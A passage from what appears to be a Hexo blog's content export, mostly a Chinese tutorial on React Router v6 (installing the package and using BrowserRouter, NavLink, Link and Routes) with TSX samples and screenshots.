<span class="attr">jsx</span>&gt;</span>&#123;`</span></span><br><span class="line"><span class="language-xml">        h1 &#123;</span></span><br><span class="line"><span class="language-xml">          color: $&#123;activated? &#x27;red&#x27; : &#x27;black&#x27;&#125;;</span></span><br><span class="line"><span class="language-xml">          font-family: monospace;</span></span><br><span class="line"><span class="language-xml">        &#125;</span></span><br><span class="line"><span class="language-xml">      `&#125;<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;ms2Time(milliseconds)&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code> style jsx</code> 中，<code>color</code> 后面的值不是固定的，利用 ES6 的字符串模板功能，可以根据 <code>activated</code> 的值动态决定是 <code>red</code> 还是 <code>black</code>：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611481542342-7d29edc4-489f-4777-88f5-85ba28e26268.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1611481542342-7d29edc4-489f-4777-88f5-85ba28e26268.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React Router</title>
      <link href="/2023/07/14/frontend/react/react-router/"/>
      <url>/2023/07/14/frontend/react/react-router/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>React Router 是 React 生态系统中最受欢迎的第三方库之一，近一半的 React 项目中使用了 React Router，下面就来看看如何在 React 项目中使用 React Router v6 吧！</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662995791557-e779da1d-1d8f-4c14-a7ef-7f890b2b1ff1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662995791557-e779da1d-1d8f-4c14-a7ef-7f890b2b1ff1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="PbkOO"></a></p><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>React Router 创建于 2014 年，是一个用于 React 的声明式、基于组件的客户端和服务端路由库，它可以保持 UI 与 URL 同步，拥有简单的 API 与强大的功能。</p><p>大多数现代 React 项目使用 npm、yarn、pnpm 等包管理器来管理项目依赖项。要将 React Router 添加到现有项目，就需要根据使用的包管理器来安装依赖：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// npm</span></span><br><span class="line">npm install react-router-dom@<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pnpm</span></span><br><span class="line">pnpm add react-router-dom@<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// yarn</span></span><br><span class="line">yarn add react-router-dom@<span class="number">6</span></span><br></pre></td></tr></table></figure><p><br />接下来，使用 CodeSandBox 来创建一个 React + TypeScript 项目，使用核心库的版本如下：<br />● <code>react</code>：18.0.0<br />● <code>react-dom</code>：18.0.0<br />● <code>react-router</code>：6.3.0<br />● <code>react-router-dom</code>：6.3.0</p><p>Demo 初始目录结构如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-public - src - <span class="title class_">App</span>.<span class="property">tsx</span> - index.<span class="property">tsx</span> - style.<span class="property">css</span> - package.<span class="property">json</span> - tsconfig.<span class="property">json</span>;</span><br></pre></td></tr></table></figure><p><br />在介绍 React Router 的概念以前，需要先区分两个概念：<br />● <code>react-router</code>：为 React 应用提供了路由的核心功能；<br />● <code>react-router-dom</code>：基于 react-router，加入了在浏览器运行环境下的一些功能。<br><a name="dyQq5"></a></p><h2 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2. 基本使用"></a>2. 基本使用<br /><br /></h2><p><a name="QIgv5"></a></p><h3 id="（1）BrowserRouter"><a href="#（1）BrowserRouter" class="headerlink" title="（1）BrowserRouter"></a>（1）BrowserRouter</h3><p>要想在 React 应用中使用 React Router，就需要在 React 项目的根文件（<code>index.tsx</code>）中导入 Router 组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">StrictMode</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="title class_">ReactDOMClient</span> <span class="keyword">from</span> <span class="string">&quot;react-dom/client&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">BrowserRouter</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&quot;./App&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rootElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOMClient</span>.<span class="title function_">createRoot</span>(rootElement);</span><br><span class="line"></span><br><span class="line">root.<span class="title function_">render</span>(</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">StrictMode</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">BrowserRouter</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">App</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">BrowserRouter</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">StrictMode</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><br />在这个文件中，我们导入了 <code>BrowserRouter</code> 组件，然后使用该组件包裹了 <code>App</code> 组件。现在，在这个 <code>BrowserRouter</code> 组件中，来自<code>react-router-dom</code> 的其他组件和 <code>hooks</code> 就可以正常工作了。</p><p><code>BrowserRouter</code> 是最常用的路由方式，即浏览器路由。官方文档也建议将 <code>BrowserRouter</code> 组件用于 Web 应用程序。除了这种方式，React Router 还支持其他几种路由方式：<br />● <code>HashRouter</code>：在路径前加入#成为一个哈希值，Hash 模式的好处是不会因为刷新页面而找不到对应路径；<br />● <code>MemoryRouter</code>：不存储 history，路由过程保存在内存中，适用于 React Native 这种非浏览器环境；<br />● <code>NativeRouter</code>：配合 React Native 使用，多用于移动端；<br />● <code>StaticRouter</code>：主要用于服务端渲染时。</p><p><a name="x12C9"></a></p><h3 id="（2）NavLink"><a href="#（2）NavLink" class="headerlink" title="（2）NavLink"></a>（2）NavLink</h3><p>在创建导航链接之前，先在<code>App.tsx</code>组件中创建一个标题：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />页面如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662970699982-3af125f5-5d4f-402b-b56b-4fa2a5b3caaa.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662970699982-3af125f5-5d4f-402b-b56b-4fa2a5b3caaa.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>下面来创建三个导航链接，这些链接会指向<code>App.tsx</code> 中的一些路由。这时就需要导入 <code>NavLink</code> 组件，它是一个导航链接组件，类似于 HTML 中的<code>&lt;a&gt;</code>标签。<code>NavLink</code> 组件使用 <code>to</code> 来指定需要跳转的链接：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NavLink</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;product&quot;</span>&gt;</span>产品<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;about&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />当点击“<strong>首页</strong>”时，就会跳转至路由 <code>/</code>：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662971350273-835d4cf8-c878-40db-9672-0192a71da50f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662971350273-835d4cf8-c878-40db-9672-0192a71da50f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>当点击“<strong>产品</strong>”时，就会跳转至路由<code>/product</code>：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662971401707-09ae526e-92f0-4440-8908-9bbad46dcb4c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662971401707-09ae526e-92f0-4440-8908-9bbad46dcb4c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>当点击“<strong>关于</strong>”时，就会跳转至路由 <code>/about</code>：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662971622842-d80c3a3b-6283-43a8-9a9c-f64003606e09.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662971622842-d80c3a3b-6283-43a8-9a9c-f64003606e09.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以看到，当点击这些导航链接时，网页的 URL 就会改变，跳转到对应的路由。</p><p>NavLink 是存在 active 状态的，所以可以为 active 状态和非 active 状态的导航链接添加样式：<br />接下来为导航链接添加样式判断条件，选择性的为其添加 nav-active 类：<br />当点击“<strong>首页</strong>”时，会跳转到首页，导航链接会变成 active 状态。这时，“<strong>首页</strong>”二字会变成红色，字体也会加粗：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662992349286-46633e7b-ace4-4e6c-9eae-7480a295d324.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662992349286-46633e7b-ace4-4e6c-9eae-7480a295d324.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ihCFJ"></a></p><h3 id="（3）Link"><a href="#（3）Link" class="headerlink" title="（3）Link"></a>（3）Link</h3><p>在 <code>react-router-dom</code> 中，可以使用 <code>Link</code> 组件来创建常规链接。<code>Link</code> 组件与 <code>NavLink</code> 组件非常相似，唯一的区别就是 <code>NavLink</code> 存在 <code>active</code> 状态，而 <code>Link</code> 没有。</p><p><code>Link</code> 组件和 <code>NavLink</code> 组件的使用方式类似，例如在产品页面有一个返回首页的按钮，需要传递给 <code>to</code> 需要跳转的路径：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Link</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Product</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;product&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span>&gt;</span>返回首页<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /><strong>注意：</strong>要链接到页面，需要使用 <code>/</code>，这表明正在导航到基本路由，要想跳转到其他路由页面，需要使用这种格式：<code>/路由名称</code>，例如：<code>/about</code>，<code>/settings</code>。</p><p>如果需要对 <code>Link</code> 进行更多控制，也可以传递给 <code>to</code> 一个对象，在这个对象中，可以通过 <code>search</code> 属性来添加查询字符串或通过 <code>hash</code> 属性来传递 <code>hash</code>值，例如：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Link</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Settings</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;settings&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Link</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">to</span>=<span class="string">&#123;&#123;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">pathname:</span> &quot;/<span class="attr">settings</span>&quot;,</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">search:</span> &quot;?<span class="attr">sort</span>=<span class="string">date</span>&quot;,</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">hash:</span> &quot;#<span class="attr">hash</span>&quot;,</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          &#125;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span></span></span><br><span class="line"><span class="language-xml">          设置</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />点击“<strong>设置</strong>”时，路由就变成了：<code>/settings?sort=date#hash</code></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662975289166-03cab505-7a57-4a7c-ba1c-5e2d62ec0a3f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662975289166-03cab505-7a57-4a7c-ba1c-5e2d62ec0a3f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ZlGGM"></a></p><h3 id="（4）Routes"><a href="#（4）Routes" class="headerlink" title="（4）Routes"></a>（4）Routes</h3><p>下面来看看如何将路由映射为对应的页面（组件）。首先需要从 <code>react-router-dom</code> 中导入一个名为 <code>Routes</code> 的组件，它将包含可以在页面特定部分显示的所有不同的路由。</p><p>在 <code>index.tsx</code> 中进行如下修改：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NavLink</span>, <span class="title class_">Routes</span>, <span class="title class_">Route</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Product</span> <span class="keyword">from</span> <span class="string">&quot;./Product&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;product&quot;</span>&gt;</span>产品<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;about&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Routes</span>&gt;</span><span class="tag">&lt;/<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />我们需要在 <code>Routes</code> 组件中使用 <code>Route</code> 组件来定义所有路由。该组件接受两个 <code>props</code>：<br />●<code>path</code>：页面 URL 应导航到的路径，类似于 <code>NavLink</code> 组件的 <code>to</code>；<br />●<code>element</code>：页面导航到该路由时加载的元素。</p><p><code>Route</code> 组件用于将应用的位置映射到不同的 React 组件。例如，当用户导航到 <code>/product</code> 路径时呈现 <code>Product</code> 组件，可以这样来写：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NavLink</span>, <span class="title class_">Routes</span>, <span class="title class_">Route</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Product</span> <span class="keyword">from</span> <span class="string">&quot;./Product&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">About</span> <span class="keyword">from</span> <span class="string">&quot;./About&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&quot;./Home&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Error</span> <span class="keyword">from</span> <span class="string">&quot;./Error&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;product&quot;</span>&gt;</span>产品<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;about&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Home</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/product&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span 